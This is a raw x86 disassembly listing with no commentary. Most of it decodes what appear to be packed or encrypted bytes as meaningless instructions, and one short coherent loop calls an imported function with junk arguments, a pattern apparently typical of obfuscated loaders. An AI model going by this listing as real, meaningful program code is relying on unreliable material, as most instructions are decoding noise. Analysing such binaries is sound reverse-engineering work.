  40487e:	rol    DWORD PTR [ebp-0x3d54cc3a],1
  404884:	jle    0x40483d
  404886:	cmc    
  404887:	push   ecx
  404888:	arpl   WORD PTR [eax-0x33],dx
  40488b:	add    al,0x14
  40488d:	mov    WORD PTR [edi+0x11df6bb4],gs
  404893:	mov    fs,WORD PTR [eax+0x5b811f3c]
  404899:	fistp  WORD PTR [eax+edx*1]
  40489c:	mov    dh,0x66
  40489e:	cmp    dh,dl
  4048a0:	and    bh,bh
  4048a2:	imul   ebp,DWORD PTR [ebx-0x1f8dbb4],0x854bc8e6
  4048ac:	mov    esi,0xc462e9f9
  4048b1:	fcomp  DWORD PTR [edx-0x3296d6b]
  4048b7:	fld    TBYTE PTR [esi]
  4048b9:	neg    BYTE PTR [ecx+ebp*8+0x1f407fb6]
  4048c0:	pushf  
  4048c1:	lods   eax,DWORD PTR ds:[esi]
  4048c2:	mov    cs,WORD PTR [edi+0x5c6c2e5b]
  4048c8:	jnp    0x404870
  4048ca:	arpl   WORD PTR [ebx],di
  4048cc:	inc    ebp
  4048cd:	dec    esp
  4048ce:	movsx  esi,WORD PTR [esi+0x15]
  4048d2:	fsubr  st(3),st
  4048d4:	scas   eax,DWORD PTR es:[edi]
  4048d5:	jmp    0x93c4:0xe19c08ef
  4048dc:	aas    
  4048dd:	shr    DWORD PTR [edi+esi*4],1
  4048e0:	or     eax,0xfc326946
  4048e5:	mov    WORD PTR [edi*1-0x51e7328a],cs
  4048ec:	xchg   ebp,eax
  4048ed:	adc    eax,0x35d0e4b8
  4048f2:	pop    esi
  4048f3:	mov    al,0xd1
  4048f5:	mov    ds:0x51fd393b,al
  4048fa:	in     al,dx
  4048fb:	pop    ds
  4048fc:	test   BYTE PTR [edx],bh
  4048fe:	add    ch,bl
  404900:	pop    edx
  404901:	xchg   edi,eax
  404902:	bound  esp,QWORD PTR [ecx-0x4d]
  404905:	xor    al,dh
  404907:	pop    edi
  404908:	lods   al,BYTE PTR ds:[esi]
  404909:	(bad)  
  40490a:	pop    ebx
  40490b:	cmc    
  40490c:	das    
  40490d:	out    0x3c,al
  40490f:	into   
  404910:	xchg   BYTE PTR [edi-0xa74f2b1],bh
  404916:	ins    BYTE PTR es:[edi],dx
  404917:	jecxz  0x404921
  404919:	iret   
  40491a:	inc    esp
  40491b:	xor    DWORD PTR [esi-0x52],0x31c2adf4
  404922:	xor    DWORD PTR [edx+0x6a],esi
  404925:	xlat   BYTE PTR ds:[ebx]
  404926:	pop    ss
  404927:	mov    ebp,0x4775730e
  40492c:	nop
  40492d:	jb     0x4048f6
  40492f:	es sbb cl,ch
  404932:	cmp    DWORD PTR [ebx-0xe],0x7c608db
  404939:	jl     0x4048c8
  40493b:	or     dh,ch
  40493d:	xchg   ecx,eax
  40493e:	mov    al,0x57
  404940:	or     BYTE PTR [eax-0x73],0xf0
  404944:	mov    bl,0x7e
  404946:	adc    ecx,DWORD PTR [ebx-0xe4215fc]
  40494c:	mov    ds:0xa811736a,eax
  404951:	loopne 0x404980
  404953:	clc    
  404954:	push   esp
  404955:	int    0x9f
  404957:	push   ebx
  404958:	mov    ecx,0x7d76f274
  40495d:	push   0xffffff81
  40495f:	data16 in al,0x4c
  404962:	pop    esi
  404963:	mov    bl,0xde
  404965:	push   esi
  404966:	push   esp
  404967:	aas    
  404968:	pop    ebx
  404969:	adc    BYTE PTR [eax],ah
  40496b:	lea    edi,[ebp-0x1fdebbf]
  404971:	push   es
  404972:	sub    ebx,0x25
  404975:	imul   edx,eax,0xfffffff6
  404978:	imul   ecx,DWORD PTR [edx],0x7c
  40497b:	jle    0x404950
  40497d:	rcr    BYTE PTR [edi+eax*4],cl
  404980:	stos   DWORD PTR es:[edi],eax
  404981:	imul   ebp,DWORD PTR [esi+0x23f6e613],0x3d
  404988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404989:	add    ah,al
  40498b:	sub    eax,0x8feaca8e
  404990:	mov    BYTE PTR [ebp-0x1],al
  404993:	cmp    BYTE PTR [edi],cl
  404995:	sahf   
  404996:	sbb    BYTE PTR [ebx-0x7a0a833a],0xe1
  40499d:	inc    ebp
  40499e:	sbb    ch,BYTE PTR [edx+ebp*2-0x2f3c1d82]
  4049a5:	sti    
  4049a6:	jp     0x404941
  4049a8:	push   es
  4049a9:	lock mov ah,0xe3
  4049ac:	xchg   ecx,eax
  4049ad:	xchg   ebp,eax
  4049ae:	pusha  
  4049af:	pop    eax
  4049b0:	data16 stos BYTE PTR es:[edi],al
  4049b2:	sbb    bl,BYTE PTR [ebx-0x6c]
  4049b5:	add    edi,esi
  4049b7:	push   ebx
  4049b8:	repnz std 
  4049ba:	in     al,dx
  4049bb:	mov    eax,0x91ce04a2
  4049c0:	cmp    bl,BYTE PTR [edi]
  4049c2:	xchg   ebx,eax
  4049c3:	push   esp
  4049c4:	inc    ebp
  4049c5:	mov    BYTE PTR [ecx-0x3d],dl
  4049c8:	scas   al,BYTE PTR es:[edi]
  4049c9:	mov    esi,0xf1d876f9
  4049ce:	stos   DWORD PTR es:[edi],eax
  4049cf:	jmp    0x40498d
  4049d1:	sub    DWORD PTR [ecx],ebp
  4049d3:	pop    ss
  4049d4:	int3   
  4049d5:	in     al,dx
  4049d6:	cmp    BYTE PTR [edi-0x60],dh
  4049d9:	outs   dx,BYTE PTR fs:[esi]
  4049db:	in     al,0x5
  4049dd:	jne    0x404a1c
  4049df:	in     al,0xc9
  4049e1:	das    
  4049e2:	js     0x4049cb
  4049e4:	or     ebx,DWORD PTR [ecx]
  4049e6:	mov    dh,0xdf
  4049e8:	jecxz  0x4049d6
  4049ea:	pop    ds
  4049eb:	xor    dh,BYTE PTR [edi+0x73d68115]
  4049f1:	imul   ebx,DWORD PTR [edi],0xffffffd1
  4049f4:	cli    
  4049f5:	xor    al,0x85
  4049f7:	cmp    eax,0x74c619d6
  4049fc:	jb     0x404a4e
  4049fe:	icebp  
  4049ff:	out    0xfd,al
  404a01:	data16 stos BYTE PTR es:[edi],al
  404a03:	or     eax,0x3ca4593b
  404a08:	push   ds
  404a09:	nop
  404a0a:	push   ss
  404a0b:	in     eax,dx
  404a0c:	sar    BYTE PTR [ebp-0x66da0d42],cl
  404a12:	mov    eax,ds:0xfcd71e7b
  404a17:	inc    ebp
  404a18:	cmp    BYTE PTR [edx],ah
  404a1a:	xchg   ecx,eax
  404a1b:	repnz int3 
  404a1d:	mov    bh,0x7d
  404a1f:	inc    esp
  404a20:	lods   al,BYTE PTR ds:[esi]
  404a21:	fadd   st(0),st
  404a23:	jmp    0x404a9f
  404a25:	outs   dx,DWORD PTR ds:[esi]
  404a26:	xor    eax,0x42f0335f
  404a2b:	adc    eax,0x70774f9
  404a30:	std    
  404a31:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a33:	rol    BYTE PTR [ecx-0x63],cl
  404a36:	sub    eax,0xc3d565ce
  404a3b:	aad    0x5d
  404a3d:	or     BYTE PTR [eax-0x1ef710c3],bh
  404a43:	mov    ch,0x15
  404a45:	xor    al,0xd7
  404a47:	inc    esp
  404a48:	aad    0x95
  404a4a:	xchg   esi,eax
  404a4b:	dec    eax
  404a4c:	pop    ss
  404a4d:	mov    ecx,0x7510850
  404a52:	and    DWORD PTR ds:0x42a839,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a839
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a839,esi
  404a69:	cmp    DWORD PTR ds:0x42a839,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a839,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a839
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a839,esi
  404ab7:	cmp    DWORD PTR ds:0x42a839,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a7fd
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	xchg   ebx,eax
  404ae3:	add    al,0x39
  404ae5:	mov    ds:0x78782e46,al
  404aea:	dec    ebp
  404aeb:	jle    0x404b65
  404aed:	js     0x404aa3
  404aef:	inc    esi
  404af0:	test   al,0x36
  404af2:	fisubr WORD PTR [edx]
  404af4:	int3   
  404af5:	mov    ecx,fs
  404af7:	dec    esp
  404af8:	cmp    ch,ah
  404afa:	test   BYTE PTR [ecx+eiz*8+0x7bf71a86],dh
  404b01:	mov    bh,0x45
  404b03:	and    al,0x93
  404b05:	sbb    DWORD PTR [edi+0x25a943a6],esp
  404b0b:	daa    
  404b0c:	aad    0xa4
  404b0e:	ss pop esi
  404b10:	dec    esp
  404b11:	dec    eax
  404b12:	inc    edx
  404b13:	pop    esi
  404b14:	jne    0x7103020a
  404b1a:	sub    ah,ch
  404b1c:	shr    edx,0xa4
  404b1f:	out    0x32,eax
  404b21:	pushf  
  404b22:	(bad)  
  404b23:	loop   0x404acc
  404b25:	lea    esi,[edx-0x39]
  404b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b29:	ret    0x4538
  404b2c:	mov    WORD PTR [edi-0xd2106ce],ds
  404b32:	mov    eax,ds:0x30677908
  404b37:	pusha  
  404b38:	arpl   dx,cx
  404b3a:	jmp    0x404b6c
  404b3c:	bound  eax,QWORD PTR [edx+0x42]
  404b3f:	mov    ch,0x7e
  404b41:	rcr    DWORD PTR [ebp-0x1997837f],cl
  404b47:	rcl    DWORD PTR [esi],1
  404b49:	out    0x32,al
  404b4b:	test   eax,0x7cca5ac3
  404b50:	into   
  404b51:	sbb    eax,0x984bbca2
  404b56:	adc    cl,BYTE PTR [eax+0x4ace3014]
  404b5c:	inc    ebx
  404b5d:	nop
  404b5e:	sub    edx,ecx
  404b60:	pusha  
  404b61:	stc    
  404b62:	mov    ch,0xd7
  404b64:	out    dx,al
  404b65:	shr    esp,0x67
  404b68:	or     bl,cl
  404b6a:	shr    bl,cl
  404b6c:	ja     0x404b5b
  404b6e:	mov    ds:0x5df444e5,al
  404b73:	jmp    0xb81f:0xdb9bdb27
  404b7a:	sub    cl,BYTE PTR [edx-0x17d89005]
  404b80:	scas   al,BYTE PTR es:[edi]
  404b81:	mov    al,0xdb
  404b83:	(bad)  
  404b84:	fcom   QWORD PTR [edx+0x3a]
  404b87:	or     bl,BYTE PTR [ecx+eiz*1]
  404b8a:	xchg   esp,eax
  404b8b:	fwait
  404b8c:	mov    cl,0x20
  404b8e:	mov    dl,0x45
  404b90:	test   eax,0x29e75049
  404b95:	xchg   esp,eax
  404b96:	imul   ebp,edx,0xbf477b03
  404b9c:	sbb    al,0x6e
  404b9e:	call   0x83cd:0xaecbfcdb
  404ba5:	ds sbb eax,0xe4ef9640
  404bab:	mov    ebx,0xb5a60f46
  404bb0:	push   0xffffffdd
  404bb2:	div    BYTE PTR [edx-0x3237f18c]
  404bb8:	mov    cl,0xf9
  404bba:	mov    ecx,0x9f1512ba
  404bbf:	sbb    al,0x98
  404bc1:	loop   0x404b91
  404bc3:	jne    0x404c36
  404bc5:	ins    DWORD PTR es:[edi],dx
  404bc6:	mov    eax,ds:0xbe797640
  404bcb:	inc    eax
  404bcc:	jle    0x404bc1
  404bce:	(bad)  
  404bcf:	mov    ah,0x98
  404bd1:	mov    edi,0x83c46fcb
  404bd6:	ins    BYTE PTR es:[edi],dx
  404bd7:	or     esp,esp
  404bd9:	jle    0x404c59
  404bdb:	test   eax,0xc2f1e052
  404be0:	cli    
  404be1:	mov    ds:0xc5e1986a,al
  404be6:	pop    edx
  404be7:	and    DWORD PTR [ebx+0x11d3b86b],esp
  404bed:	lahf   
  404bee:	or     eax,0xe0d40b59
  404bf3:	xor    eax,0x2b8cb0dd
  404bf8:	shl    DWORD PTR [ecx+0x2fd60c1f],cl
  404bfe:	push   ebp
  404bff:	cmc    
  404c00:	arpl   WORD PTR [esi+0x736daa5e],cx
  404c06:	mov    BYTE PTR [esi+0x7dbe2614],cl
  404c0c:	or     DWORD PTR [esi+0xc198376],ecx
  404c12:	pusha  
  404c13:	jbe    0x404c86
  404c15:	clc    
  404c16:	fidiv  DWORD PTR [eax+ebp*8-0x5a]
  404c1a:	sbb    bh,cl
  404c1c:	into   
  404c1d:	sub    dh,dl
  404c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c20:	out    dx,eax
  404c21:	neg    BYTE PTR [ebx+0x5c]
  404c24:	clts   
  404c26:	xchg   DWORD PTR [edi+0x6],edi
  404c29:	sbb    DWORD PTR [edx-0x41dead9c],esp
  404c2f:	jbe    0x404c6d
  404c31:	jnp    0x404c6a
  404c33:	daa    
  404c34:	sub    al,0xdc
  404c36:	mov    ecx,0xeb03ad
  404c3b:	pop    es
  404c3c:	scas   al,BYTE PTR es:[edi]
  404c3d:	dec    eax
  404c3e:	jecxz  0x404c27
  404c40:	cmp    ebp,0xe31d3e7b
  404c46:	mov    bl,0xf5
  404c48:	xor    cl,BYTE PTR [edx+0x3dccdb1d]
  404c4e:	int3   
  404c4f:	js     0x404bfd
  404c51:	je     0x404c27
  404c53:	(bad)  
  404c55:	lea    esp,ds:0x9f3d4313
  404c5b:	inc    esi
  404c5c:	pusha  
  404c5d:	dec    esi
  404c5e:	retf   
  404c5f:	ret    0x9911
  404c62:	push   es
  404c63:	dec    esi
  404c64:	xchg   esp,eax
  404c65:	and    DWORD PTR [ebx+0x31],0xed73c07e
  404c6c:	mov    eax,0xd4a92375
  404c71:	and    BYTE PTR [edx],0x8b
  404c74:	popa   
  404c75:	adc    eax,0xbebcf600
  404c7a:	fadd   DWORD PTR [ebx-0x52]
  404c7d:	rcl    BYTE PTR [esi+0x63],0x24
  404c81:	xor    ecx,ecx
  404c83:	(bad)  [edx]
  404c85:	and    al,0xba
  404c87:	test   al,0xe2
  404c89:	fs push esi
  404c8b:	add    DWORD PTR [ecx+0x6b],0x631d1308
  404c92:	sahf   
  404c93:	out    dx,eax
  404c94:	jg     0x404c9d
  404c96:	test   eax,0xe1c5a210
  404c9b:	mov    dh,0xe4
  404c9d:	mov    ebx,0xdbd1488c
  404ca2:	fneni(8087 only) 
  404ca4:	cdq    
  404ca5:	scas   al,BYTE PTR es:[edi]
  404ca6:	or     bl,cl
  404ca8:	aam    0x12
  404caa:	or     eax,0xf66b558
  404caf:	sub    BYTE PTR [eax],cl
  404cb1:	inc    esp
  404cb2:	mov    dh,0x3a
  404cb4:	jle    0x404cb4
  404cb6:	push   edx
  404cb7:	sar    BYTE PTR [ebx],0x47
  404cba:	xchg   esp,eax
  404cbb:	mov    ecx,0x7e2f1eb8
  404cc0:	mov    BYTE PTR [edi-0x3d],dl
  404cc3:	inc    esp
  404cc4:	inc    ecx
  404cc5:	push   edx
  404cc6:	push   esi
  404cc7:	aad    0xa3
  404cc9:	sub    bh,BYTE PTR [esi]
  404ccb:	inc    esp
  404ccc:	sbb    eax,0x941233d3
  404cd1:	mov    al,0x67
  404cd3:	mul    DWORD PTR ds:0xa276fac6
  404cd9:	push   edx
  404cda:	mov    dl,0x89
  404cdc:	cld    
  404cdd:	je     0x404cbc
  404cdf:	sar    bl,0x21
  404ce2:	outs   dx,DWORD PTR ds:[esi]
  404ce3:	in     al,0x5e
  404ce5:	popf   
  404ce6:	dec    ebp
  404ce7:	mov    DWORD PTR [ebx+ebp*2+0x20148007],eax
  404cee:	cs mov bl,0xd9
  404cf1:	in     eax,dx
  404cf2:	mov    bh,dh
  404cf4:	out    dx,al
  404cf5:	fwait
  404cf6:	ja     0x404d19
  404cf8:	ret    
  404cf9:	sbb    cl,BYTE PTR [ebx]
  404cfb:	pop    ecx
  404cfc:	clc    
  404cfd:	icebp  
  404cfe:	jl     0x404cfd
  404d00:	daa    
  404d01:	or     eax,0x277cc581
  404d06:	(bad)
  404d0a:	and    dl,dl
  404d0c:	fisub  DWORD PTR [ebx+0x1d226ee1]
  404d12:	xor    dl,bh
  404d14:	pop    ecx
  404d15:	and    edi,esi
  404d17:	sub    BYTE PTR [bp+si],bh
  404d1a:	add    al,cl
  404d1c:	jecxz  0x404d23
  404d1e:	shl    cl,0x60
  404d21:	cdq    
  404d22:	jns    0x404ce6
  404d24:	cmp    BYTE PTR [edx+0x7bbc582e],cl
  404d2a:	cmp    al,0xc4
  404d2c:	add    DWORD PTR [esi-0x40e0106b],ebp
  404d32:	lds    edi,FWORD PTR [ebx+0x12]
  404d35:	scas   eax,DWORD PTR es:[edi]
  404d36:	xor    cl,BYTE PTR [edx-0x5f0ddc0a]
  404d3c:	or     BYTE PTR [eax+0x4b],al
  404d3f:	das    
  404d40:	loop   0x404d28
  404d42:	cwde   
  404d43:	out    dx,al
  404d44:	mov    ebx,0x7bfc895e
  404d49:	mov    eax,es
  404d4b:	or     bl,BYTE PTR [ecx]
  404d4d:	and    eax,0x238daa74
  404d52:	pushf  
  404d53:	call   0xdcf82968
  404d58:	mov    es,WORD PTR [edx]
  404d5a:	xrelease mov DWORD PTR ds:[eax-0x7259060a],ebx
  404d62:	shl    DWORD PTR [edx+0x5b2515d1],1
  404d68:	sahf   
  404d69:	mov    al,0xcf
  404d6b:	pop    ebx
  404d6c:	jnp    0x404dbc
  404d6e:	xchg   esi,eax
  404d6f:	or     DWORD PTR [edi-0x42],0x79
  404d73:	repz (bad) 
  404d75:	(bad)  
  404d76:	(bad)  
  404d77:	adc    esi,DWORD PTR [esi]
  404d79:	les    ebp,FWORD PTR [ecx-0x6]
  404d7c:	test   eax,eax
  404d7e:	idiv   DWORD PTR [ebx-0x4beef864]
  404d84:	cli    
  404d85:	ja     0x404db5
  404d87:	sub    edi,DWORD PTR [eax+0x62]
  404d8a:	hlt    
  404d8b:	xlat   BYTE PTR ds:[ebx]
  404d8c:	lea    ebx,[ecx+0x5a159f11]
  404d92:	push   es
  404d93:	(bad)  
  404d94:	or     al,ch
  404d96:	cmp    al,0x3e
  404d98:	pop    edi
  404d99:	jae    0x404d49
  404d9b:	push   esi
  404d9c:	popf   
  404d9d:	stc    
  404d9e:	sbb    BYTE PTR [ebx-0x311549fc],bl
  404da4:	mov    bh,0xef
  404da6:	xchg   esi,eax
  404da7:	jmp    0x96fd2660
  404dac:	loope  0x404d6f
  404dae:	movups xmm3,xmm5
  404db1:	and    DWORD PTR [esi],eax
  404db3:	sub    BYTE PTR [ebx-0x4b8dcdf],al
  404db9:	xor    DWORD PTR [ebp+0x5cf628d5],0xffffffa9
  404dc0:	ret    0x8b57
  404dc3:	jge    0x404dd5
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	ds mov ds,ebx
  404deb:	loopne 0x404d88
  404ded:	xor    edi,DWORD PTR [eax+0x78]
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404e53
  404df5:	inc    esp
  404df6:	hlt    
  404df7:	shl    al,0xd3
  404dfa:	gs in  eax,0x57
  404dfd:	mov    dh,0xc3
  404dff:	aad    0x26
  404e01:	fadd   DWORD PTR [edx]
  404e03:	(bad)  
  404e04:	cwde   
  404e05:	push   eax
  404e06:	push   eax
  404e07:	cmc    
  404e08:	cmp    ebp,DWORD PTR [edi+0x3c5f65d7]
  404e0e:	ins    DWORD PTR es:[edi],dx
  404e0f:	xchg   ecx,eax
  404e10:	fldcw  WORD PTR [ebp-0x15]
  404e13:	push   eax
  404e14:	cmc    
  404e15:	dec    eax
  404e16:	mov    bh,0x11
  404e18:	inc    ecx
  404e19:	xchg   ebx,eax
  404e1a:	test   al,0xdc
  404e1c:	int3   
  404e1d:	addr16 adc al,0xd
  404e20:	fwait
  404e21:	xor    bl,dl
  404e23:	out    0x84,eax
  404e25:	fisttp QWORD PTR [edx-0x2ee56971]
  404e2b:	push   esi
  404e2c:	bound  ecx,QWORD PTR [edx+0x24e319b0]
  404e32:	or     al,0x3e
  404e34:	mov    esp,0xbe5e1c19
  404e39:	push   0x5d0b0fd6
  404e3e:	ds xchg edx,eax
  404e40:	in     al,dx
  404e41:	(bad)  
  404e42:	xchg   ebp,eax
  404e43:	cmp    ebp,DWORD PTR [ebx+edi*4]
  404e46:	or     eax,0xbd2195b6
  404e4b:	add    esi,eax
  404e4d:	sub    DWORD PTR [edi-0x6a],esp
  404e50:	mov    esp,0xc07c47e5
  404e55:	adc    ebp,DWORD PTR [ebp+esi*8+0x37]
  404e59:	xchg   edi,eax
  404e5a:	scas   eax,DWORD PTR es:[edi]
  404e5b:	cmp    eax,DWORD PTR [ebx+0x4b]
  404e5e:	mov    dl,0x2d
  404e60:	add    al,0xb3
  404e62:	fsubr  DWORD PTR [eax]
  404e64:	aam    0x32
  404e66:	dec    ecx
  404e67:	xchg   esp,eax
  404e68:	out    dx,al
  404e69:	inc    ebp
  404e6a:	(bad)  
  404e6b:	mov    bh,0xed
  404e6d:	lea    ecx,[esi]
  404e6f:	push   0xffffffc7
  404e71:	(bad)  
  404e72:	and    al,0x4e
  404e74:	imul   eax,DWORD PTR [ebp+0x67bb86b8],0x1a
  404e7b:	xrstors [ebp-0x3b]
  404e7f:	mov    ebx,0x77b3e334
  404e84:	jns    0x404ebe
  404e86:	fisub  WORD PTR [ebp-0x36abd7fe]
  404e8c:	retf   0x82cc
  404e8f:	test   bh,ch
  404e91:	or     al,BYTE PTR [edx-0x69]
  404e94:	adc    al,0xa7
  404e96:	add    al,0xe5
  404e99:	test   bh,dh
  404e9b:	(bad)  
  404e9c:	push   ss
  404e9d:	xor    BYTE PTR [ecx-0x4600918f],bl
  404ea3:	push   ecx
  404ea4:	js     0x404eb7
  404ea6:	nop
  404ea7:	mov    ss,esi
  404ea9:	mov    dl,al
  404eab:	test   bl,cl
  404ead:	aad    0x3e
  404eaf:	popa   
  404eb0:	lahf   
  404eb1:	sbb    BYTE PTR [edi+0x40],bh
  404eb4:	pmaxsw mm6,mm2
  404eb7:	xchg   ebp,eax
  404eb8:	cld    
  404eb9:	mov    dl,BYTE PTR [esi]
  404ebb:	or     bl,ah
  404ebd:	in     eax,dx
  404ebe:	dec    eax
  404ebf:	pop    eax
  404ec0:	fild   QWORD PTR [edi]
  404ec2:	and    al,0xdc
  404ec4:	ret    
  404ec5:	fwait
  404ec6:	cwde   
  404ec7:	lock add al,0xe7
  404eca:	scas   eax,DWORD PTR es:[edi]
  404ecb:	stos   BYTE PTR es:[edi],al
  404ecc:	fisttp QWORD PTR [esi-0x40]
  404ecf:	xor    DWORD PTR [ebp-0x29],esi
  404ed2:	adc    esi,eax
  404ed4:	out    dx,eax
  404ed5:	mov    eax,ds:0xe32b6fe5
  404eda:	xor    bh,BYTE PTR [edx-0xa8b6278]
  404ee0:	test   DWORD PTR [esi+0xeb6161d],eax
  404ee6:	out    dx,eax
  404ee7:	adc    al,al
  404ee9:	rol    DWORD PTR [esi-0x34fa9b7b],cl
  404eef:	cmovns ebp,DWORD PTR [edx]
  404ef2:	cmc    
  404ef3:	push   es
  404ef4:	in     al,0xf2
  404ef6:	add    al,0xc2
  404ef8:	sbb    BYTE PTR [edx-0x4f5c1c31],al
  404efe:	icebp  
  404eff:	fwait
  404f00:	mov    esi,0x104aa482
  404f05:	dec    ebp
  404f06:	sub    BYTE PTR [ebp-0x1318a917],ah
  404f0c:	mov    eax,0x88c23d66
  404f11:	adc    ch,0x70
  404f14:	sub    esi,ecx
  404f16:	push   ebp
  404f17:	repz pop edi
  404f19:	nop
  404f1a:	xlat   BYTE PTR ds:[ebx]
  404f1b:	idiv   DWORD PTR [edi]
  404f1d:	dec    ebx
  404f1e:	and    cl,BYTE PTR [edx+edx*2]
  404f21:	push   es
  404f22:	xor    eax,0x6a4896b2
  404f27:	inc    ebx
  404f28:	mov    ch,0xc5
  404f2a:	sub    eax,0x85129275
  404f2f:	not    DWORD PTR [eax-0x36]
  404f32:	outs   dx,DWORD PTR ds:[esi]
  404f33:	iret   
  404f34:	loop   0x404ec0
  404f36:	(bad)  
  404f37:	mov    ah,BYTE PTR [ecx+ebp*1]
  404f3a:	cli    
  404f3b:	aad    0x39
  404f3d:	sub    BYTE PTR [ebp+0x355a308a],dl
  404f43:	xchg   edx,eax
  404f44:	dec    ecx
  404f45:	stos   DWORD PTR es:[edi],eax
  404f46:	inc    esp
  404f47:	aaa    
  404f48:	push   0x6afb9add
  404f4d:	push   eax
  404f4e:	push   esp
  404f4f:	xchg   DWORD PTR [esi+0x859ce26],edx
  404f55:	cld    
  404f56:	call   0x9326:0x6ba91e6b
  404f5d:	push   es
  404f5e:	iret   
  404f5f:	aad    0xb3
  404f61:	xchg   esp,eax
  404f62:	sub    dh,BYTE PTR [ecx-0x550b92]
  404f68:	ds push ebp
  404f6a:	std    
  404f6b:	test   al,0xfc
  404f6d:	mov    WORD PTR [bp+si+0x1613],es
  404f72:	ss mov dl,0x15
  404f75:	nop
  404f76:	int3   
  404f77:	push   ebx
  404f78:	dec    esi
  404f79:	jnp    0x404fec
  404f7b:	lods   eax,DWORD PTR ds:[esi]
  404f7c:	mov    bh,0xfe
  404f7e:	or     ah,dh
  404f80:	add    ah,ah
  404f82:	pop    ds
  404f83:	sahf   
  404f84:	icebp  
  404f85:	hlt    
  404f86:	xchg   BYTE PTR [edx+0x4c80aebf],bl
  404f8c:	pop    ebx
  404f8d:	xchg   esp,eax
  404f8e:	lea    edx,[eax+0x75df3ef]
  404f94:	retf   
  404f95:	imul   ecx,DWORD PTR [esi+0x2337d611],0xffffff8f
  404f9c:	jl     0x404f9c
  404f9e:	jmp    0x4e78f921
  404fa3:	in     eax,0xee
  404fa5:	sbb    DWORD PTR [eax],ecx
  404fa7:	in     eax,0x83
  404fa9:	ret    
  404faa:	dec    eax
  404fab:	aas    
  404fac:	stos   BYTE PTR es:[edi],al
  404fad:	mov    bh,0xb4
  404faf:	jl     0x404f3e
  404fb1:	add    eax,DWORD PTR [edi+ebx*1]
  404fb4:	mov    esi,0xcb38689f
  404fb9:	push   edx
  404fba:	xchg   BYTE PTR [esi-0x32711a37],al
  404fc0:	jp     0x404f94
  404fc2:	mov    ecx,0xd023d4a5
  404fc7:	mov    WORD PTR [ebx],es
  404fc9:	std    
  404fca:	adc    ebx,DWORD PTR [edi]
  404fcc:	cmp    edx,DWORD PTR [eax-0x5b]
  404fcf:	icebp  
  404fd0:	add    ebp,DWORD PTR [ebx]
  404fd2:	xor    eax,0xa6fecbf2
  404fd7:	add    ebp,DWORD PTR [eax]
  404fd9:	lds    ebp,FWORD PTR [esi-0x289dfa8e]
  404fdf:	test   BYTE PTR ds:0xe2b0745,bl
  404fe5:	mov    BYTE PTR [edi],0xe6
  404fe8:	push   ss
  404fe9:	div    DWORD PTR [edx-0x1f]
  404fec:	inc    edx
  404fed:	xchg   edi,eax
  404fee:	adc    ch,BYTE PTR [edx-0x74]
  404ff1:	mov    WORD PTR [ecx],ds
  404ff3:	mov    DWORD PTR [edx-0x7a5087b8],esi
  404ff9:	adc    ch,BYTE PTR [edx+0x2144ead0]
  404fff:	shl    BYTE PTR [edi-0x24d9bf8b],1
  405005:	pop    eax
  405006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405007:	sub    DWORD PTR [edi],edi
  405009:	ffreep st(2)
  40500b:	inc    edi
  40500c:	bound  eax,QWORD PTR [ebx+edi*4]
  40500f:	and    eax,0x1551d636
  405014:	test   dl,cl
  405016:	es inc esi
  405018:	xchg   ebp,eax
  405019:	dec    ebp
  40501a:	mov    bh,0x13
  40501c:	ss lahf 
  40501e:	cli    
  40501f:	or     edi,DWORD PTR [eax+ebx*8]
  405022:	mov    DWORD PTR [ecx+edi*1+0x63],esp
  405026:	stc    
  405027:	xor    DWORD PTR [eax+0x61],ecx
  40502a:	iret   
  40502b:	ror    DWORD PTR [edx-0x8],cl
  40502e:	sub    al,0x19
  405030:	les    esi,FWORD PTR [esi+eax*8+0x23]
  405034:	(bad)  
  405035:	repz jb 0x405015
  405038:	add    al,0x4d
  40503a:	daa    
  40503b:	scas   eax,DWORD PTR es:[edi]
  40503c:	out    dx,al
  40503d:	xor    ebx,DWORD PTR [ecx+0x6cb23251]
  405043:	jge    0x405008
  405045:	jne    0x40505a
  405047:	ds (bad) 
  405049:	pop    ecx
  40504a:	loopne 0x405031
  40504c:	xchg   ebx,eax
  40504d:	lods   al,BYTE PTR ds:[esi]
  40504e:	xor    BYTE PTR [esi-0x7943ca5],ch
  405054:	out    dx,al
  405055:	cmp    DWORD PTR [edi+0x7b],0xdd476b64
  40505c:	sbb    cl,0xa5
  40505f:	inc    esp
  405060:	(bad)  
  405061:	into   
  405062:	aas    
  405063:	inc    edx
  405064:	jge    0x4050c7
  405066:	in     eax,0x98
  405068:	shr    DWORD PTR [esi+0x7a],1
  40506b:	jnp    0x405072
  40506d:	or     BYTE PTR [eax+0x1d],dh
  405070:	push   ebx
  405071:	or     al,0x3a
  405073:	dec    ebx
  405074:	mov    DWORD PTR [edi+0x5b],ebp
  405077:	jecxz  0x4050a8
  405079:	adc    ch,BYTE PTR [eax]
